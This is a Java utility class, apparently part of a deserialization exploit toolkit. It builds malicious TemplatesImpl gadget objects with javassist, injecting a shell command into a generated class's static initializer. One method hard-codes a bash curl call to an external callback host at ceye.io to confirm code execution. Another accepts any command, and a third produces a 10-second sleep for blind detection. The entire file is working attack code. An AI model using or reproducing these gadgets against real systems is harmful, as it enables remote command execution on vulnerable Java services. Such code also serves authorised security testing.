package util;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.*;

import java.io.IOException;

public class GadgetUtils {

    public static TemplatesImpl createTemplatesImpl(String cmd)throws CannotCompileException, NotFoundException, IOException, InstantiationException, IllegalAccessException, NoSuchFieldException{
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass("Squirt1e");
        cc.makeClassInitializer().insertBefore(cmd);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        cc.writeFile();
        byte[] classBytes = cc.toBytecode();
        byte[][] targetByteCodes = new byte[][]{classBytes};

        //补充实例化新建类所需的条件
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        ReflectionUtils.setFieldValue(templates, "_bytecodes", targetByteCodes);
        ReflectionUtils.setFieldValue(templates, "_name", "Squirt1e");
        return templates;
    }

    //whoami
    public static TemplatesImpl getTemplatesImpl() throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, InstantiationException, IllegalAccessException {
        String cmd = "java.lang.Runtime.getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",\"curl http://bgb5eh.ceye.io\"});";
        return createTemplatesImpl(cmd);
    }
    //定制命令
    public static TemplatesImpl getTemplatesImpl(String cmd) throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, InstantiationException, IllegalAccessException {
        String cm = "java.lang.Runtime.getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",\""+cmd+"\"});";
        return createTemplatesImpl(cm);
    }

    //延时检测，不执行命令
    public static TemplatesImpl getDelayTemplatesImpl() throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, InstantiationException, IllegalAccessException {
        String cmd = "Thread.currentThread().sleep(10000L);";
        return createTemplatesImpl(cmd);
    }
}
